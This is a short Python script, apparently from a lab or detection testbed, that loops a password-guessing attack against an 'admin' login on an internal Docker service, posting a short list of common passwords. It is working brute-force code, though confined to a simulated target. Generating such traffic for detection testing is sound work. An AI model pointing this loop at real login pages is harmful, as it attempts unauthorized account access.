"""
Network-secured version of BruteForce/HTTPBruteForce.py
Modified to target consumer service on internal Docker network
"""

import requests
import time
import random

# SECURITY: Use internal Docker network address
url = "http://consumer:5000/login"
username = "admin"
passwords = ["admin", "12345", "letmein", "senha"]

print(f"[HTTP BruteForce] Starting HTTP brute force simulation")
print(f"[HTTP BruteForce] Target: {url}")

while True:
    for pwd in passwords:
        data = {"username": username, "password": pwd}
        try:
            print(f"[HTTP BruteForce] POST {url} - {username}:{pwd}")
            resp = requests.post(url, data=data, timeout=3)
            print(f"[HTTP BruteForce] Response: {resp.status_code}")
        except Exception as e:
            print(f"[HTTP BruteForce] Error: {type(e).__name__}")

    time.sleep(random.randint(20, 60))
